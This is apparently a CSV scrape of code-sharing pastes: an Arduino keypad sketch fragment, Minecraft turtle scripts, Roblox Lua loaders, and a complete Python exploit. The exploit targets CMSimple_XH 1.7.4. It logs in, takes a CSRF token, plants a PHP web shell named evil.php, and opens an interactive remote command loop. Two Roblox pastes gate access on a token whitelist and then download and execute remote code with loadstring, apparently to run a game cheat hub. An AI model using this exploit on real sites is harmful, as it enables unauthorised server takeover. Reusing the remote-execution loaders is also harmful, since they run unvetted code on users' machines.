id,title,username,language,date,content
      lcd.print(TECLA);         // envia a monitor serial la tecla presionada
    }   
  }
 estado=0;
  lcd.setCursor(0,1);
  lcd.print(""CLAVE CAMBIADA"");
  delay(2000);
  limpia();
}

///////////////////// limpia //////////////////////////////
void limpia(){  
 lcd.setCursor(0,0);
 lcd.print(""CLAVE :          "");
 lcd.setCursor(9,0);
}"
PnFTkgmc,whiLoader,UpdateHub,Lua,Friday 2nd of June 2023 04:15:28 PM CDT,"local token = _G.token
local check = ""https://whitelisthandler.000webhostapp.com/tokens.php?key="" .. token

if game:HttpGet(check) == ""Whitelisted"" then
    loadstring(game:HttpGet(""https://raw.githubusercontent.com/AtomicDesigner/Wild-Horse-Islands/master/whiSource.lua?token=GHSAT0AAAAAACDLBBQ7VIMQO6ZUP4B3QQ3YZD2LQJA""))()
else
    game.Players.LocalPlayer:Kick(game:HttpGet(check))
end"
iPLzN2ew,BoomDropRemote,Phemto,Lua,Friday 2nd of June 2023 03:32:49 PM CDT,"--Wait for a redstone signal and then activate the drop protocol
--start with lava is slot 1
local channel = 45  --destination number

--initialize the modem
modem = peripheral.wrap(""left"")
modem.open(channel)

args = { ... }

turtle.turnRight()
turtle.turnRight()  		--should be facing toward the player now

while true do
  	os.pullEvent(""redstone"") -- wait for a ""redstone"" event
  	if rs.getInput(""top"") then -- check the input
		--This is a call to start dropping. 
		modem.transmit(channel, 2,  ""ON"")
		print(""Sending Drop Signal"")
		modem.closeAll()
	end
	sleep(20)
	turtle.select(1)
	turtle.dig()
	turtle.place()
end 


		"
z16Sm2ex,Exploit,Denitsu,Python,Friday 2nd of June 2023 03:19:50 PM CDT,"# Exploit Title: CMSimple_XH 1.7.4 - Remote Code Execution (RCE) (Authenticated)
# Date: 01-10-2021
# Exploit Author: Halit AKAYDIN (hLtAkydn)
# Vendor Homepage: https://www.cmsimple-xh.org/
# Software Link: https://www.cmsimple-xh.org/?Downloads
# Version: 1.7.4
# Category: Webapps
# Tested on: Linux/Windows


# CMSimple_XH is an open source project under GPL3 license
# Includes an endpoint that allows remote access
# Backup page is misconfigured, causing security vulnerability
# User information with sufficient permissions is required.

# Example: python3 exploit.py -u http://example.com -p Admin123



from bs4 import BeautifulSoup
from time import sleep
import requests
import argparse


def main():
    parser = argparse.ArgumentParser(description='CMSimple_XH Version 1.7.4 - Remote Code Execution (Authenticated)')
    parser.add_argument('-u', '--host', type=str, required=True)
    parser.add_argument('-p', '--password', type=str, required=True)
    args = parser.parse_args()
    print(""\nCMSimple_XH Version 1.7.4 - Remote Code Execution (Authenticated)"",
        ""\nExploit Author: Halit AKAYDIN (hLtAkydn)\n"")
    host(args)


def host(args):
    # Check http or https
    if args.host.startswith(('http://', 'https://')):
        print(""[?] Check Url...\n"")
        sleep(2)
        args.host = args.host
        if args.host.endswith('/'):
            args.host = args.host[:-1]
        else:
            pass
    else:
        print(""\n[?] Check Adress...\n"")
        sleep(2)
        args.host = ""http://"" + args.host
        args.host = args.host
        if args.host.endswith('/'):
            args.host = args.host[:-1]
        else:
            pass

    # Check Host Status
    try:
        response = requests.get(args.host)
        if response.status_code == 200:
            login(args)
        else:
            print(""[-] Address not reachable!"")
            sleep(2)

    except requests.ConnectionError as exception:
        print(""[-] Address not reachable!"")
        sleep(2)
        exit(1)


def login(args):
    url = args.host + ""/?&login""
    cookies = {
        ""XH_2f"": ""evil""
    }
    headers = {
        ""Origin"": args.host,
        ""Content-Type"": ""application/x-www-form-urlencoded"",
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"",
        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
        ""Referer"": args.host + ""/?&login""
    }
    data = {
        ""login"": ""true"",
        ""keycut"": args.password,
        ""submit"": ""Login""
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data)

    token = response.cookies.get(""XH_2f"")
    soup = BeautifulSoup(response.text, 'html.parser')

    if (soup.find(""link"", {""rel"": ""next""})['href'] != ""/""):
        print(""[!] Login Success!\n"")
        sleep(2)
        csrf(args, token)
    else:
        print(""[!] Wrong password!!\n"")
        sleep(2)


def csrf(args, token):
    url = args.host + ""/?file=content""
    cookies = {
        ""status"": ""adm"",
        ""XH_2f"": token
    }
    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"",
        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
        ""Referer"": args.host + ""/?&settings"",
        ""Accept-Encoding"": ""gzip, deflate"",
        ""Connection"": ""close""
    }
    response = requests.get(url, headers=headers, cookies=cookies)

    try:
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf = soup.find_all(""input"", type=""hidden"")[3].get(""value"")
        create(args, token, csrf)
    except Exception as e:
        print(e)
    else:
        pass


def create(args, token, csrf):
    payload = ""<?php\r\nfile_put_contents('./evil.php', \""\\x3c\\x3fphp system(\\x24_GET['cmd']);\\x3f\\x3e\"");\r\n?>\r\n""

    url = args.host
    cookies = {
        ""status"": ""adm"",
        ""XH_2f"": token
    }
    headers = {
        ""Origin"": args.host,
        ""Content-Type"": ""application/x-www-form-urlencoded"",
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"",
        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
        ""Referer"": args.host + ""/?file=content&action=edit&xh_success=content"",
        ""Accept-Encoding"": ""gzip, deflate""
    }
    data = {
        ""text"": payload,
        ""file"": ""content"",
        ""action"": ""save"",
        ""xh_csrf_token"": csrf
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=True)

    if (response.status_code == 200):
        print(""[!] Create Vuln File!\n"")
        sleep(2)
        exploit(args)
    else:
        print(""[!] Create Failed!\n"")
        sleep(2)


def exploit(args):
    print(""[+] Exploit Done!\n"")
    sleep(2)

    while True:
        cmd = input(""$ "")
        url = args.host + ""/evil.php?cmd="" + cmd
        headers = {
            ""Upgrade-Insecure-Requests"": ""1"",
            ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0""
        }

        response = requests.post(url, headers=headers, timeout=5)

        if response.text == """":
            print(cmd + "": command not found\n"")
        else:
            print(response.text)


if __name__ == '__main__':
    main()
"
LsCb0hAP,WaterDrop,Phemto,Lua,Friday 2nd of June 2023 03:18:30 PM CDT,"--Wait for a redstone signal and then activate the drop protocol for WaterDrop
--does not actually need a dropper
--start with water in slot 1 and 2

local channel = 0  --destination number

--initialize the modem
modem = peripheral.wrap(""left"")
modem.open(channel)

args = { ... }

turtle.select(3)
turtle.back()
for i=1,50,1 do
	turtle.digDown()
	turtle.down()
end
turtle.up()
turtle.select(1)
turtle.placeDown()
for i=1,49,1 do 
	turtle.up()
end
turtle.dig()
turtle.forward()
turtle.turnRight()
turtle.turnRight()
turtle.select(3)
turtle.place()
while true do
  	os.pullEvent(""redstone"") -- wait for a ""redstone"" event
  	if rs.getInput(""top"") then -- check the input
		--This is a call to start dropping. 
		modem.transmit(channel, 2,  ""ON"")
		print(""Sending Drop Signal"")
		modem.closeAll()
		turtle.dig()
		sleep(10)
		turtle.digDown()
		turtle.select(2)
		turtle.placeDown()
		sleep(20)
		turtle.select(3)
		turtle.place()
	end
end 


		"
3Zf5TWJU,Untitled,UpdateHub,Lua,Friday 2nd of June 2023 03:07:39 PM CDT,"local token = _G.token
local check = ""https://whitelisthandler.000webhostapp.com/tokens.php?key="" .. token

if game:HttpGet(check) == ""Whitelisted"" then

local plrs = game:GetService(""Players"")
local AlreadyLoaded = plrs.LocalPlayer.PlayerGui:FindFirstChild(""whiHub"")

if AlreadyLoaded then
	for i, v in pairs(plrs.LocalPlayer.PlayerGui:GetChildren()) do
		if v.Name == ""whiHub"" then
			v:Destroy()
		end
	end
end

wait()

local whiHub = Instance.new(""ScreenGui"")
local main = Instance.new(""Frame"")
local title = Instance.new(""TextLabel"")
local UICorner = Instance.new(""UICorner"")
local UICorner_2 = Instance.new(""UICorner"")
local jungle = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local reset = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local volc = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")
local lunar = Instance.new(""TextButton"")
local UICorner_6 = Instance.new(""UICorner"")
local jungleH = Instance.new(""TextButton"")
local UICorner_7 = Instance.new(""UICorner"")
local volcH = Instance.new(""TextButton"")
local UICorner_8 = Instance.new(""UICorner"")
local lunarh = Instance.new(""TextButton"")
local UICorner_9 = Instance.new(""UICorner"")

--Properties:
whiHub.Name = ""whiHub""
whiHub.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
whiHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
whiHub.ResetOnSpawn = false

main.Name = ""main""
main.Parent = whiHub
main.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Position = UDim2.new(0, 931, 0, 274)
main.Size = UDim2.new(0, 259, 0, 163)
